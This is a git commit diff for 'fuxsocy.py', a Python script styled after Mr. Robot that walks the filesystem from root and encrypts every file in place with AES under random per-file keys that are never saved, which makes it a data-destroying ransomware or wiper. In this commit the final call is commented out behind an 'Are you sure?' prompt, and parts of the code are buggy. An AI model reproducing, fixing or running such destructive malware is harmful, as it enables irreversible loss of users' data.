6c989f3c5ef84495bfe8d253f9c5f6be3d2e5d4b
Joe Kendal <kendaljoe0@gmail.com>
2017-05-13 02:15:34 +0100

    unix

--- fuxsocy.py
+++ fuxsocy.py
@@ -7,13 +7,18 @@ from Crypto import Random
 from random import SystemRandom
 from string import ascii_letters, digits, punctuation
 
-def encrypt(key, fn):
+
+def encrypt(root, filename):
+    fn = root + '/' + filename
+    print('encrypting ' + fn)
+    pw = 'fsociety'.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(4, 16)))) for x in range(SystemRandom().randint(8, 12)))
+    hasher = SHA256.new(pw.encode('utf-8'))
+    key = hasher.digest()
     cs = 64*1024
     of = fn
     fs = str(os.path.getsize(fn)).zfill(16)
     iv = Random.new().read(16)
     encryptor = AES.new(key, AES.MODE_CBC, iv)
-
     with open(fn, 'rb') as infile:
         with open(of, 'wb') as outfile:
             outfile.write(fs.encode('utf-8'))
@@ -23,12 +28,39 @@ def encrypt(key, fn):
                 if len(c) == 0:
                     break
                 elif len(c) % 16 != 0:
-                    c += b' ' * (16 - (len(chunk) % 16))
+                    c += b' ' * (16 - (len(c) % 16))
                 outfile.write(encryptor.encrypt(c))
 
-def getKey(salt='fsociety'):
-    pw = salt.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(4, 16)))) for x in range(SystemRandom().randint(8, 12)))
-    hasher = SHA256.new(pw.encode('utf-8'))
-    return hasher.digest()
+
+def recurse(directory):
+    root = next(os.walk(directory))[0]
+    directories = next(os.walk(directory))[1]
+    files = next(os.walk(directory))[2]
+
+    for file in files:
+        encrypt(root, file)
+
+    if len(directories) > 0:
+        for directory in directories:
+            subdirectories = next(os.walk(os.path.join(root, directory)))[1]
+            if len(subdirectories) > 0:
+                for subdirectory in subdirectories:
+                    path = root + '/' + directory + '/' + subdirectory
+                    try:
+                        recurse(directory=path)
+                    except UnicodeEncodeError:
+                        pass
+            else:
+                pass
 
 
+def main():
+    start_dir = '/'
+    if input('Are you sure? (y/n) ') == 'y':
+        # recurse(start_dir)
+        pass
+    else:
+        print('Good')
+
+if __name__ == '__main__':
+    main()
